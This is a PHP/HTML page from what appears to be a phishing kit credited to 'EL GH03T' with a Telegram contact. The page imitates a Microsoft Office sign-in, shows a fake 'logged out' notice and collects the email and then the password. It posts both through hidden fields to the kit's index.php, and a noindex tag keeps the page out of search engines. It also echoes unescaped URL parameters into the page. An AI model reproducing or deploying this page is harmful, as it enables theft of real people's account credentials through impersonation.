<?php
    /*******
    Main Author: EL GH03T
    Contact me on telegram : @elgh03t / https://t.me/elgh03t
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html style="height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="shortcut icon" href="../assets/imgs/favicon2.ico" type="image/x-icon" />

        <title>Login</title>
    </head>

    <body style="background: url(../assets/imgs/bg.jpg) center center no-repeat; background-size: cover; height: 100%; padding-top: 150px;">
        
        <div class="office">
            <div class="logo mt-4 mb-4"><img src="../assets/imgs/logo2.jpg"></div>

            <form class="" id="login-form">
                <legend>Sign in</legend>
                <div class="form-group">
                    <div class="error-login">Your account has been logged out, log back in</div>
                    <input type="text" name="email" id="email" class="form-control" placeholder="Email or phone">
                </div>
                <p>No account?  <span>Create one!</span></p>
                <p><span>Logging in with a security key</span></p>
                <p><span>Access options</span></p>
                <div class="form-group text-right">
                    <button type="button" style="cursor: pointer;" id="next">Next</button>
                </div>
            </form>

            <form method="post" action="../index.php" id="pass-form">
                <input type="hidden" name="verbot">
                <input type="hidden" name="step" value="office">
                <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                <input type="hidden" name="emaill" id="emaill" value="<?php echo $_GET['email']; ?>">
                <div class="go-back"><a href="../index.php?redirection=office"><i class="fas fa-arrow-left"></i></a> <span><?php echo $_GET['email']; ?></span></div>
                <h3>Enter your password</h3>
                <div class="form-group">
                    <div class="error-pass <?php if( $_GET['error'] == 1 ) { echo 'd-block'; } ?>">Your account or password is incorrect.</div>
                    <input type="password" name="password" id="password" class="form-control" placeholder="Password">
                </div>
                <div class="form-group form-check">
                    <input type="checkbox" class="form-check-input" id="exampleCheck1">
                    <label class="form-check-label" for="exampleCheck1">Keep me connected</label>
                </div>
                <p><span>Forgot password?</span></p>
                <div class="form-group text-right">
                    <button id="login-submit" style="cursor: pointer;" type="button">Sign in</button>
                </div>
            </form>

        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>
        
        <script type="text/javascript">

            $('#next').click(function(){
                var email = $('#email').val();
                if( email == '' ) {
                    $('.error-login').html('This Microsoft account does not exist. Please enter another account or create a new one.');
                } else {
                    $('.error-login').hide();
                    $('#login-form').hide();
                    $('#pass-form').show();
                    $('.go-back span').text(email);
                    $('#emaill').val(email);
                }
            });

            $('#login-submit').click(function(){
                if( $('#password').val() == '' ) {
                    $('.error-pass').show();
                } else {
                    $('#pass-form').submit();
                }
            });
        </script>

    </body>

</html>